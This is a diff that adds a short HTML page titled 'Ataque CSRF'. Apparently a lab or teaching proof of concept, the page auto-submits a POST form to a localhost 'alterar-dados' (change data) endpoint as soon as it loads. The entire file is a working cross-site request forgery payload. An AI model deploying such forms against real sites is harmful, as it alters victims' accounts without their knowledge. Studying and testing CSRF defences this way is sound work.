@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Ataque CSRF</h1>
+    <form action="http://localhost:3000/alterar-dados" method="POST">
+      <input type="submit" value="Enviar">
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
